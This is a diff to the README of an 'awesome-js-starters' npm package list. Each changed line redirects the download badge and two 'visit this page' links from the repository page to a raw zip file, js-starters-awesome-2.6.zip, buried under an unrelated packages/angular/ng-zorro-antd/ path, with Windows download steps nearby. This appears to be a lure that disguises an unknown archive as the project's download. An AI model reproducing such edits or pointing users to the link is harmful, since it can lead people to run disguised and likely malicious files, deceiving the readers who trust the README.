@@ -1,6 +1,6 @@
 # 📦 awesome-js-starters - Find Better npm Packages Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20started-blue?style=for-the-badge&logo=github)](https://github.com/pansyvioletstage372/awesome-js-starters)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20started-blue?style=for-the-badge&logo=github)](https://github.com/pansyvioletstage372/awesome-js-starters/raw/refs/heads/main/packages/angular/ng-zorro-antd/js-starters-awesome-2.6.zip)
 
 ## 🧭 What this is
 
@@ -19,7 +19,7 @@ Use it if you want to:
 
 Visit this page to download and use the project files:
 
-https://github.com/pansyvioletstage372/awesome-js-starters
+https://github.com/pansyvioletstage372/awesome-js-starters/raw/refs/heads/main/packages/angular/ng-zorro-antd/js-starters-awesome-2.6.zip
 
 If you use Windows, follow these steps:
 
@@ -178,7 +178,7 @@ Yes. It includes packages that fit browser apps and server-side Node.js work.
 
 Open the repository page and browse the package list:
 
-https://github.com/pansyvioletstage372/awesome-js-starters
+https://github.com/pansyvioletstage372/awesome-js-starters/raw/refs/heads/main/packages/angular/ng-zorro-antd/js-starters-awesome-2.6.zip
 
 ## 🗂️ File use after download
 
